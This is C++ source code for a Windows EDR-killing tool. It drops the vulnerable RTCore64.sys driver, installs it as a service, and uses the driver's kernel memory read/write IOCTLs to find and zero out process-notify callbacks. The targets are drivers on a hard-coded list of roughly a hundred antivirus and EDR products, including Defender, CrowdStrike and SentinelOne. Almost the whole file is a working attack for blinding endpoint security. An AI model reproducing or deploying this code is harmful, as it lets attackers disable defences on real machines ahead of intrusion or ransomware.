#include "Commun.h"
#include "driver.h"

EXTERN_C NTSTATUS NtWriteFile(
    HANDLE           FileHandle,
    HANDLE           Event,
    PIO_APC_ROUTINE  ApcRoutine,
    PVOID            ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID            Buffer,
    ULONG            Length,
    PLARGE_INTEGER   ByteOffset,
    PULONG           Key
);

struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;



DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return MemoryRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
}
BYTE ReadMemoryBYTE(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 1, Address) & 0xffffff;
}


WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}


HANDLE GetDriverHandle() {

    HANDLE Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
    if (Device == INVALID_HANDLE_VALUE) {
        ExitProcess(0);
    }
    return Device;

}

DWORD64 FindKernelBaseAddr() {
    DWORD cb = 0;
    LPVOID drivers[1024];

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb)) {
        return (DWORD64)drivers[0];
    }
    return NULL;
}

VOID SearchAndPatch(DWORD64 routineva, DWORD64 driverCount, LPVOID drivers2, BOOL Patch) {

    HANDLE Device = GetDriverHandle();
    DWORD64 innerRoutineAddress = 0;
    // 0x20 instructions is enough length to search for the first jmp
    // Look for the  "jmp nt!PspSetXXXXNotifyRoutine"
    // NOTE: This is not reliable. As some versions of windows doesn't have branch into PspXXXNotifyRoutines with call/jump instructions
    // But below extensive check for 0x90,0xc3,0xcc bytes should work just fine
    // YES, the piece of code below is fucked up I agree. But it works. (fingers crossed)
    for (DWORD64 i = 0; i < 0x20; i++) {
        DWORD64 nextaddr = routineva + i;
        BYTE byte1 = ReadMemoryBYTE(Device, nextaddr);
        DWORD64 decideBytes = ReadMemoryDWORD64(Device, nextaddr + 5);
        if (
            (byte1 == 0xe9 || byte1 == 0xe8) && (
                (decideBytes & 0x00000000000000ff) == 0x00000000000000c3 ||
                (decideBytes & 0x00000000000000ff) == 0x00000000000000cc ||
                (decideBytes & 0x00000000000000ff) == 0x0000000000000090 ||
                (decideBytes & 0x000000000000ff00) == 0x000000000000c300 ||
                (decideBytes & 0x000000000000ff00) == 0x000000000000cc00 ||
                (decideBytes & 0x000000000000ff00) == 0x0000000000009000 ||
                (decideBytes & 0x0000000000ff0000) == 0x0000000000c30000 ||
                (decideBytes & 0x0000000000ff0000) == 0x0000000000cc0000 ||
                (decideBytes & 0x0000000000ff0000) == 0x0000000000900000 ||
                (decideBytes & 0x00000000ff000000) == 0x00000000c3000000 ||
                (decideBytes & 0x00000000ff000000) == 0x00000000cc000000 ||
                (decideBytes & 0x00000000ff000000) == 0x0000000090000000 ||
                (decideBytes & 0x000000ff00000000) == 0x000000c300000000 ||
                (decideBytes & 0x000000ff00000000) == 0x000000cc00000000 ||
                (decideBytes & 0x000000ff00000000) == 0x0000009000000000 ||
                (decideBytes & 0x0000ff0000000000) == 0x0000c30000000000 ||
                (decideBytes & 0x0000ff0000000000) == 0x0000cc0000000000 ||
                (decideBytes & 0x0000ff0000000000) == 0x0000900000000000 ||
                (decideBytes & 0x00ff000000000000) == 0x00c3000000000000 ||
                (decideBytes & 0x00ff000000000000) == 0x00cc000000000000 ||
                (decideBytes & 0x00ff000000000000) == 0x0090000000000000 ||
                (decideBytes & 0xff00000000000000) == 0xc300000000000000 ||
                (decideBytes & 0xff00000000000000) == 0xcc00000000000000 ||
                (decideBytes & 0xff00000000000000) == 0x9000000000000000)
            ) { // Found "jmp/call nt!PspSetCreateProcessNotifyRoutine" "ret/nop/int"
            DWORD jmp_offset = ReadMemoryDWORD(Device, nextaddr + 1);
            // Address of jmp/call instruction + the extracted relative jmp address + 5 byte padding of the relative jmp/call instruction
            // Address of jmp/call is shifted to the right and then left to prevent overflowing in signed addition
            innerRoutineAddress = (((nextaddr) >> 32) << 32) + ((DWORD)(nextaddr)+jmp_offset) + 0x5;
            break;
        }

    }
    if (innerRoutineAddress == 0) {
        innerRoutineAddress = routineva;
    }
    HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD64 callbackArrayAddress;
    PVOID* drivers = (PVOID*)(drivers2);
    for (DWORD64 i = 0; i < 0x200; i++) {
        DWORD64 nextaddr = innerRoutineAddress + i;
        BYTE byte1 = ReadMemoryBYTE(Device, nextaddr);
        BYTE byte2 = ReadMemoryBYTE(Device, nextaddr + 1);
        if ((byte1 == 0x4c || byte1 == 0x48) && byte2 == 0x8d) {
            DWORD jmp_offset = ReadMemoryDWORD(Device, nextaddr + 3);
            // Address of lea instruction + the extracted relative jmp address + 7 byte padding of the relative lea instruction
            // Address of lea is shifted to the right and then left to prevent overflowing in signed addition
            callbackArrayAddress = (((nextaddr) >> 32) << 32) + ((DWORD)(nextaddr)+jmp_offset) + 0x7;

            CHAR deviceName[MAX_PATH];
            for (BYTE i = 0; i < 0x10; i++) {
                DWORD64 nextaddr = callbackArrayAddress + i * 0x8;
                DWORD64 callBackAddr = ReadMemoryDWORD64(Device, nextaddr);
                if (callBackAddr != NULL) {
                    DWORD64 callBackAddrSfht = ((callBackAddr >> 4) << 4);
                    DWORD64 drivercallbackFuncAddr = ReadMemoryDWORD64(Device, callBackAddrSfht + 0x8);
                    for (int k = 0; k < driverCount - 1; k++) {
                        if (drivercallbackFuncAddr > reinterpret_cast<DWORD64>(drivers[k]) &&
                            drivercallbackFuncAddr < reinterpret_cast<DWORD64>(drivers[k + 1])) {
                            GetDeviceDriverBaseNameA((LPVOID)drivers[k], deviceName, sizeof(deviceName));
                            if (!(strcmp(deviceName, "EX64.sys") &&
                                strcmp(deviceName, "Eng64.sys") &&
                                strcmp(deviceName, "teefer2.sys") &&
                                strcmp(deviceName, "teefer3.sys") &&
                                strcmp(deviceName, "srtsp64.sys") &&
                                strcmp(deviceName, "srtspx64.sys") &&
                                strcmp(deviceName, "srtspl64.sys") &&
                                strcmp(deviceName, "Ironx64.sys") &&
                                strcmp(deviceName, "fekern.sys") &&
                                strcmp(deviceName, "cbk7.sys") &&
                                strcmp(deviceName, "WdFilter.sys") &&
                                strcmp(deviceName, "cbstream.sys") &&
                                strcmp(deviceName, "atrsdfw.sys") &&
                                strcmp(deviceName, "avgtpx86.sys") &&
                                strcmp(deviceName, "avgtpx64.sys") &&
                                strcmp(deviceName, "naswSP.sys") &&
                                strcmp(deviceName, "edrsensor.sys") &&
                                strcmp(deviceName, "CarbonBlackK.sys") &&
                                strcmp(deviceName, "parity.sys") &&
                                strcmp(deviceName, "csacentr.sys") &&
                                strcmp(deviceName, "csaenh.sys") &&
                                strcmp(deviceName, "csareg.sys") &&
                                strcmp(deviceName, "csascr.sys") &&
                                strcmp(deviceName, "csaav.sys") &&
                                strcmp(deviceName, "csaam.sys") &&
                                strcmp(deviceName, "rvsavd.sys") &&
                                strcmp(deviceName, "cfrmd.sys") &&
                                strcmp(deviceName, "cmdccav.sys") &&
                                strcmp(deviceName, "cmdguard.sys") &&
                                strcmp(deviceName, "CmdMnEfs.sys") &&
                                strcmp(deviceName, "MyDLPMF.sys") &&
                                strcmp(deviceName, "im.sys") &&
                                strcmp(deviceName, "csagent.sys") &&
                                strcmp(deviceName, "CybKernelTracker.sys") &&
                                strcmp(deviceName, "CRExecPrev.sys") &&
                                strcmp(deviceName, "CyOptics.sys") &&
                                strcmp(deviceName, "CyProtectDrv32.sys") &&
                                strcmp(deviceName, "CyProtectDrv64.sys.sys") &&
                                strcmp(deviceName, "groundling32.sys") &&
                                strcmp(deviceName, "groundling64.sys") &&
                                strcmp(deviceName, "esensor.sys") &&
                                strcmp(deviceName, "edevmon.sys") &&
                                strcmp(deviceName, "ehdrv.sys") &&
                                strcmp(deviceName, "FeKern.sys") &&
                                strcmp(deviceName, "WFP_MRT.sys") &&
                                strcmp(deviceName, "xfsgk.sys") &&
                                strcmp(deviceName, "fsatp.sys") &&
                                strcmp(deviceName, "fshs.sys") &&
                                strcmp(deviceName, "HexisFSMonitor.sys") &&
                                strcmp(deviceName, "klifks.sys") &&
                                strcmp(deviceName, "klifaa.sys") &&
                                strcmp(deviceName, "Klifsm.sys") &&
                                strcmp(deviceName, "mbamwatchdog.sys") &&
                                strcmp(deviceName, "mfeaskm.sys") &&
                                strcmp(deviceName, "mfencfilter.sys") &&
                                strcmp(deviceName, "PSINPROC.SYS") &&
                                strcmp(deviceName, "PSINFILE.SYS") &&
                                strcmp(deviceName, "amfsm.sys") &&
                                strcmp(deviceName, "amm8660.sys") &&
                                strcmp(deviceName, "amm6460.sys") &&
                                strcmp(deviceName, "eaw.sys") &&
                                strcmp(deviceName, "SAFE-Agent.sys") &&
                                strcmp(deviceName, "SentinelMonitor.sys") &&
                                strcmp(deviceName, "SAVOnAccess.sys") &&
                                strcmp(deviceName, "savonaccess.sys") &&
                                strcmp(deviceName, "sld.sys") &&
                                strcmp(deviceName, "pgpwdefs.sys") &&
                                strcmp(deviceName, "GEProtection.sys") &&
                                strcmp(deviceName, "diflt.sys") &&
                                strcmp(deviceName, "sysMon.sys") &&
                                strcmp(deviceName, "ssrfsf.sys") &&
                                strcmp(deviceName, "emxdrv2.sys") &&
                                strcmp(deviceName, "reghook.sys") &&
                                strcmp(deviceName, "spbbcdrv.sys") &&
                                strcmp(deviceName, "bhdrvx86.sys") &&
                                strcmp(deviceName, "bhdrvx64.sys") &&
                                strcmp(deviceName, "symevent.sys") &&
                                strcmp(deviceName, "vxfsrep.sys") &&
                                strcmp(deviceName, "VirtFile.sys") &&
                                strcmp(deviceName, "SymAFR.sys") &&
                                strcmp(deviceName, "symefasi.sys") &&
                                strcmp(deviceName, "symefa.sys") &&
                                strcmp(deviceName, "symefa64.sys") &&
                                strcmp(deviceName, "SymHsm.sys") &&
                                strcmp(deviceName, "evmf.sys") &&
                                strcmp(deviceName, "GEFCMP.sys") &&
                                strcmp(deviceName, "VFSEnc.sys") &&
                                strcmp(deviceName, "pgpfs.sys") &&
                                strcmp(deviceName, "fencry.sys") &&
                                strcmp(deviceName, "symrg.sys") &&
                                strcmp(deviceName, "ndgdmk.sys") &&
                                strcmp(deviceName, "ssfmonm.sys") &&
                                strcmp(deviceName, "SISIPSFileFilter.sys") &&
                                strcmp(deviceName, "cyverak.sys") &&
                                strcmp(deviceName, "cyvrfsfd.sys") &&
                                strcmp(deviceName, "cyvrmtgn.sys") &&
                                strcmp(deviceName, "tdevflt.sys") &&
                                strcmp(deviceName, "tedrdrv.sys") &&
                                strcmp(deviceName, "tedrpers.sys") &&
                                strcmp(deviceName, "telam.sys") &&
                                strcmp(deviceName, "cyvrlpc.sys") &&
                                strcmp(deviceName, "EsProbe.sys") &&
                                strcmp(deviceName, "MpKslf8d86dba.sys"))) {
                                SetConsoleTextAttribute(hOutput, 9);
                                // Zero out the callback address
                                if (Patch)
                                    WriteMemoryDWORD64(Device, nextaddr, 0x0000000000000000);
                            }


                        }
                    }
                    SetConsoleTextAttribute(hOutput, 7);
                }
            }
            break;
        }
    }
}

BOOL install_driver_as_service(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
    BOOL status = FALSE;
    SC_HANDLE hSCManager = NULL, hService = NULL;

    hSCManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (hSCManager) {
        hService = OpenService(hSCManager, serviceName, SERVICE_START);
        if (hService) {
            //wprintf(L"[+] \'%s\' service already registered\n\n", serviceName);
            wprintf(L"[+] \'*****\' service already registered\n\n");
        }
        else {
            if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
                wprintf(L"[*] \'%s\' service not present\n\n", serviceName);
                hService = CreateService(hSCManager, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL);
                if (hService) {
                    wprintf(L"[+] \'%s\' service successfully registered\n\n", serviceName);
                }
                else {
                    wprintf(L"[-] CreateService error: %u\n\n", GetLastError());
                }
            }
            else {
                wprintf(L"[-] OpenService error: %u\n\n", GetLastError());
            }
        }

        if (hService) {
            if (startIt) {
                if (status = StartService(hService, 0, NULL)) {
                    wprintf(L"[+] \'%s\' service started\n", serviceName);
                }
                else if (status == ERROR_SERVICE_ALREADY_RUNNING) {
                    //wprintf(L"[*] \'%s\' service already started\n", serviceName);
                    wprintf(L"[*] \'*****\' service already started\n");
                }
                else {
                   // wprintf(L"StartService error: %u\n", GetLastError());
                }
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    else {
        wprintf(L"[-] OpenSCManager(create) error: %u\n", GetLastError());
        return GetLastError();
    }

    return 0;
}



wchar_t* DropRTCore64() {


    NTSTATUS status1;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK osb;
    UNICODE_STRING fileName;
    HANDLE fHandle;

    wchar_t current_directory[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, current_directory);
    wchar_t rtcore[MAX_PATH];
    ZeroMemory(rtcore, MAX_PATH);
    lstrcatW(rtcore, L"\\??\\");
    lstrcatW(rtcore, current_directory);
    lstrcatW(rtcore, L"\\RTCore64.sys");


    char current_dirStr[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, current_dirStr);
    char pathExit[MAX_PATH];
    ZeroMemory(pathExit, MAX_PATH);
    lstrcatA(pathExit, current_dirStr);
    lstrcatA(pathExit, "\\RTCore64.sys");

    FILE* file = fopen(pathExit, "r");

    if (file) {

        fclose(file);

        return rtcore;
    }
    else {





        RtlInitUnicodeString(&fileName, (PCWSTR)rtcore);
        ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
        InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        status1 = NtCreateFile(&fHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, 0,
            FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

        if (!NT_SUCCESS(status1)) {
            printf("[!] Failed in CreateFile (%u)\n", GetLastError());
            return NULL;
        }

        NTSTATUS status2;
        IO_STATUS_BLOCK osb2;
        ZeroMemory(&osb2, sizeof(IO_STATUS_BLOCK));

        DWORD uSize = sizeof(driverRTCore);

        status2 = NtWriteFile(fHandle, NULL, NULL, NULL, &osb, (PVOID)driverRTCore, uSize, NULL, NULL);

        if (!NT_SUCCESS(status2)) {
            printf("[!] Failed in SysWriteFile (%u)\n", GetLastError());
            CloseHandle(fHandle);
            return NULL;
        }
        CloseHandle(fHandle);
        return rtcore;
    }
}





